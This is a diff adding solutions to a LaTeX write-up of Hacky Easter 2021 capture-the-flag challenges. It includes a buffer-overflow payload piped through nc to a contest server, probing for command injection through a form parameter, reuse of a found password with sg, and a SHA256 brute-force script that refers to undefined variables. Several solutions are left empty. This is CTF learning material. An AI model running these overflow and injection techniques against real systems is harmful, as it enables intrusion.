@@ -315,9 +315,52 @@ Note: The service is restarted every hour at x:00.
 \hypertarget{he21.09-solution}{%
 \subsection{HE21.09 Solution}\label{he21.09-solution}}
 
-not yet solved.
+This took some time to solve.
 
-Ideas: the hash browns point towards using a hash as a key for the image that is served.
+The hint points towards the use of a hash function, probably of 256 bit length.
+After some playing around, we found that the order always consists of an eight
+digit number and a string, possibly of two words.  The words in all capitals in
+the order correspond to the name of the png-file shown with the order.
+
+A brute forcer to find all accepted solutions for "Vanilla Cafe" found many
+solutions, but for all three pictures.  Playing a bit more around with the
+order strings in Cyber Chef and searching for \verb+0xcafe+ showed that all
+accepted orders contained the sub-string \verb+cafe+ in the SHA256 of the full
+order string.  So the problem can be solved with brute force:
+
+\begin{minted}{python}
+import hashlib
+import re
+
+colaDecafRe = re.compile(r'^.*(c01a)*(decaf).*$')
+
+def hash(text):
+    m = hashlib.sha256()
+    m.update(text)
+    return m.hexdigest()
+
+for i in range(10000000,100000000):
+    s = b'%d Cola Decaf' % i
+    h = hash(s)
+    g = colaRe.search(h)
+    if g and decafRe.search(h):
+        print('found match for s: %s' % s)
+        print(h)
+\end{minted}
+
+The script prints out the solutions
+\begin{verbatim}
+'19614073 Cola Decaf'
+'96787682 Cola Decaf'
+\end{verbatim}
+
+When sent to the order site using Postman, the order is acknowledged and the
+egg is displayed.
+
+\begin{marginfigure}
+    \includegraphics[width=50mm]{ch09/7ef384aa6ec128ef.png}
+\end{marginfigure}
+
 
 \hypertarget{he21.10}{%
 \section{HE21.10 Ghost in a Shell 1}\label{he21.10}}
@@ -541,11 +584,20 @@ Note: The service is restarted every hour at x:00.
 \item Some characters are blocked - find a workaround!
 \end{itemize}
 
-
 \hypertarget{he21.15-solution}{%
 \subsection{HE21.15 Solution}\label{he21.15-solution}}
 
-\noindent 
+\noindent The application lets us choose a web-site from a list and tells us if
+it can ping it.  So let's try to test our own sites by injecting our data into
+the \verb+url+ form parameter.
+
+Looking for \verb+twitter$.com+ shows \verb+nc: bad address 'twitter$.com'+.
+So the value is sent to nc and it reflects it to us.  Try to inject some data
+into the call \verb+$(ls /)+, but this is rejected 
+\verb+nice try - www.youtube.com/watch?v=a4eav7dFvc8+. However, we
+resist the urge to click on this url.
+
+Interestingly, \verb+$(ls)+ gives us the help screen for \verb+nc+.  
 
 \hypertarget{he21.16}{%
   \section{HE21.16 LOTL}
@@ -569,7 +621,56 @@ Executable ``lotl'' is provided.
 \hypertarget{he21.16-solution}{%
 \subsection{HE21.16 Solution}\label{he21.16-solution}}
 
-\noindent 
+\noindent The provided executable can be analysed using Ghidra and shows a main
+function with a classic buffer overflow problem from using \verb+gets+:
+
+\begin{minted}{c}
+undefined8 main(void)
+
+{
+  char pwn_me [32];
+  
+  ignore_me_init_buffering();
+  ignore_me_init_signal();
+  printf("Welcome! Please give me your name!\n> ");
+  gets(pwn_me);
+  printf("Hi %s, nice to meet you!\n",pwn_me);
+  return 0;
+}
+\end{minted} 
+
+So we can to overflow the buffer and jump to a proper place to get us a shell.
+
+Really interesting is the function \verb+profit+ at address \verb+0x0040086d+
+\begin{minted}{c}
+void profit(void)
+{
+  system("/bin/sh");
+  return;
+}
+\end{minted}
+
+In the binary are also entry points for the \verb+system+ function at address
+\verb+0x00400610+ and the string \verb+/bin/sh+ is stored at \verb+0x00400978+.
+So we can construct a shell escape.  Let us first test that we can call the
+\verb+printf+ function with the \verb+/bin/sh+ as an argument:
+
+Search for ``return to libc exploit'' or ``one gadget exploit'' to
+get the proper documentation.
+
+\begin{verbatim} 
+brp(DESKTOP-FH3H4P9)253$ printf "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDD\x2c\x08\x40\x00\x00\x00\x00\x00\n" | nc 46.101
+.107.117 2102
+Welcome! Please give me your name!
+> Hi AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDD@, nice to meet you!
+Welcome! Please give me your name!
+> [!] Anti DoS Signal. Patch me out for testing.
+brp(DESKTOP-FH3H4P9)254$
+\end{verbatim} 
+
+So we can execute printf twice...
+
+Now call system with an argument of /bin/sh
 
 \hypertarget{he21.17}{%
   \section{HE21.17 Digizzled}
@@ -1165,9 +1266,54 @@ file \verb+lost.pdf+ provided.
 \hypertarget{he21.26-solution}{%
 \subsection{HE21.26 Solution}\label{he21.26-solution}}
 
-\noindent 
+\noindent Look at the pdf using \verb+binwalk+ to find the uncompressed content
+of the PDF.  Within there are 500 lines with flags, so we have to try them
+manually or find a way to submit them automatically.  After struggling to find
+a way using python and the request library, we found it easier to rip out the
+function submit flag and abuse it.  This runs quickly and finds the flag
+\verb+{flag: "he2021{3t5Kc-PiP6Z-9xa2f-RNJrY-auDng}"}+.
 
+\begin{minted}{js}
+var arr = [
+"he2021{4MG5D-A2BSg-0ohGW-aCRKT-XNzkS}",
+...
+"he2021{hZjl3-pE1wv-IJIyV-Gl8nt-jqavv}"
+];
 
+function submit(flagText) {
+    const requestOptions = {
+      method: 'POST',
+      mode: 'cors',
+      cache: 'no-cache',
+      credentials: 'include',
+      headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
+      body: JSON.stringify({ flag: flagText })
+    };
+    fetch('https://21.hackyeaster.com/rest/user/challenge/26/checkflag', requestOptions)
+      .then(response => response.json())
+      .then(data => {
+        // check result
+        if (data && data.solveStatus) {
+          if (data.solveStatus === 'CORRECT') {
+              console.log(flagText);
+              return true;
+          }
+          return false;
+        }
+      })
+      .catch((err) => {
+        window.location.href = config.AUTH_URL;
+        return false;
+      });
+}
+
+    for(p in arr) {
+        if (submit(arr[p])) {
+            console.log(arr[p]);
+            break;
+        }
+    }
+\end{minted} 
 
 \hypertarget{he21.27}{%
   \section{HE21.27 Ghost in a Shell 2}
@@ -1198,7 +1344,75 @@ Note: The service is restarted every hour at x:00.fell into the pot with the rej
 \hypertarget{he21.27-solution}{%
 \subsection{HE21.27 Solution}\label{he21.27-solution}}
 
-\noindent 
+\noindent When we log in, we see only one file, \verb+flag?.txt+, the ASCII version of Rick-rolling.  In \verb$.lost+found$ is also a file, but it is write protected.
+
+\begin{verbatim}
+476859378aa9:~/.lost+found$ ls -l
+total 4
+-r--r-----    1 root     pacman          32 Apr  5 19:00 flag.txt
+476859378aa9:~$ cd /home/pacman
+476859378aa9:/home/pacman$ ls -la
+total 28
+drwxr-xr-x    1 root     root          4096 Apr  5 19:00 .
+-rwxr-xr-x    1 root     root             9 Apr  5 19:00 ."\?$*'N'*$?\"
+drwxr-xr-x    1 root     root          4096 Apr  3 05:23 ..
+-rwxr-xr-x    1 root     root           312 Mar  2 12:05 .bash_history
+-rwxr-xr-x    1 root     root           277 Mar  2 12:05 notes.txt
+476859378aa9:/home/pacman$ cat .\"*
+msPACM4n
+476859378aa9:/home/pacman$ cat .bash_history
+history -c
+whoami
+ls -lrt
+cd /home/pacman
+du -sh
+vi notes.txt
+clear
+cd /var/log
+passwd
+ls
+clear
+cd ~
+vi notes.txt
+man cat
+man unzip
+man sg
+find . -type f
+find . -type f | grep mp4
+find . -type f | grep mp4 | sort
+clear
+cd ~
+ps -ef | grep java
+kill 1236
+killall java
+reboot
+ls -lrt
+rm -rf /home/pacman/secret
+exit
+476859378aa9:/home/pacman$ cat notes.txt
+
+
+░█▀▀ ░█▀█ ░█ ░█▀▀ ░░█▀▀ ░█▀█ ░█ ░█
+░█▀▀ ░█▀▀ ░█ ░█ ░░░░█▀▀ ░█▀█ ░█ ░█
+░▀▀▀ ░▀ ░░░▀ ░▀▀▀ ░░▀ ░░░▀░▀ ░▀ ░▀▀▀
+
+
+476859378aa9:/home/pacman$ 
+\end{verbatim} 
+
+The first file \verb+"\?$*'N'*$?\"+ contains something that looks like a
+password: \verb+msPACM4n+
+
+Combining the history file, we see that the command \verb+sg+ was used and it
+would execute a command within another group.  The flag is owned by
+\verb+pacman+ and so we try if works with the given password:
+
+\begin{verbatim} 
+f9bc7196c810:~$ sg pacman "cat .lost\+found/flag.txt "
+Password:
+he2021{wh4ts_y0ur_grewp_4g4in?}
+f9bc7196c810:~$
+\end{verbatim} 
 
 \hypertarget{he21.28}{%
   \section{HE21.28 Haxxor what 2?}
@@ -1235,9 +1449,8 @@ Using the specification and looking at the end of file directory entries, we
 can find the values for the last three bytes (they must all be zero).  So we
 end up with \verb+xorl.tan+, only one letter missing.  Opening the decoded
 zip-file, we see a funny file name for a file that must be called
-\verb+egg.png+, so finally we have the complete key \verb+xorlatan+.
-Extracting the zip gives us the egg with the flag
-\verb+he2021{ul1m4te_x0r_m4st3r}+.
+\verb+egg.png+, so finally we have the complete key \verb+xorlatan+. Extracting
+the zip gives us the egg with the flag \verb+he2021{ul1m4te_x0r_m4st3r}+.
 
 \begin{marginfigure}
     \includegraphics[width=50mm]{ch28/egg.png}
@@ -1451,4 +1664,123 @@ qr.save('qr.png')
 \end{marginfigure}
 
 The flag is \verb+he2021{tw0_y0lks_are_gre33eat}+
+
+\hypertarget{he21.33}{%
+\section{HE21.33 Finding Mnemo}
+  \label{he21.33}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge33.jpg}
+\end{marginfigure}
+
+\noindent Dorie has forgotten everything again... Luckily, there is a backup:
+
+\begin{verbatim} 
+ adapt    3555  
+ bind     824e  
+ bless    8fcf  
+ blind    81db  
+ civil    03ec  
+ craft    ed05  
+ garage   9db4  
+ good     d2ba  
+ half     1272   
+ hip      8d53  
+ home     21b7  
+ hotel    1cb0  
+ lonely   e5b8  
+ magnet   16b9  
+ metal    770e  
+ mushroom dd80  
+ napkin   0829  
+ reason   ecd3  
+ rescue   5ef2  
+ ring     e3b0  
+ shift    4ea1  
+ small    f1f6  
+ sunset   b271  
+ tongue   f08d  
+\end{verbatim} 
+
+
+\hypertarget{he21.33-solution}{%
+\subsection{HE21.33 Solution}\label{he21.33-solution}}
+
+\noindent 
+
+\hypertarget{he21.34}{%
+\section{HE21.34 The Five Seasons}
+  \label{he21.34}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge34.jpg}
+\end{marginfigure}
+
+\noindent Did you know there were five seasons?
+
+Find the flag file!
+
+http://46.101.107.117:2111
+
+Note: The service is restarted every hour at x:00.
+\subsection{Show Hint}
+The 🐟is just a trap 😼
+
+A hint is hiding in one of the poems.
+
+\hypertarget{he21.34-solution}{%
+\subsection{HE21.34 Solution}\label{he21.34-solution}}
+
+\noindent 
+
+
+\hypertarget{he21.35}{%
+\section{HE21.35 The Snake}
+  \label{he21.35}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge35.jpg}
+\end{marginfigure}
+
+\noindent Cunning snake has a little riddle for you:
+
+\verb+21{_inake0dltn_2olospena__iht_fthet!}+
+
+\subsection{Show Hint}
+It's a self-made algorithm, not one you'll find in the web.
+Look at the snake in the title image.
+
+
+\hypertarget{he21.35-solution}{%
+\subsection{HE21.35 Solution}\label{he21.35-solution}}
+
+\noindent This is an anagram to be solved; play around with the words to find
+\verb+he2021{dont_fall_into_the_snake_pit!}+
+
+
+\hypertarget{he21.36}{%
+\section{HE21.36 Doldrums}
+  \label{he21.36}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge36.jpg}
+\end{marginfigure}
+
+\noindent Without wind, no ship can sail.
+
+This one is really secure. I promise!
+
+nc 46.101.107.117 2113
+
+Get a shell and read the flag.
+
+Note: The service is restarted every hour at x:00.
+
+File \verb+doldrums+ is provided.
+
+\subsection{Show Hint}
+Ubuntu 18.04 64 Bit
+
+\hypertarget{he21.36-solution}{%
+\subsection{HE21.36 Solution}\label{he21.36-solution}}
+
+\noindent 
+
 \end{document}
+
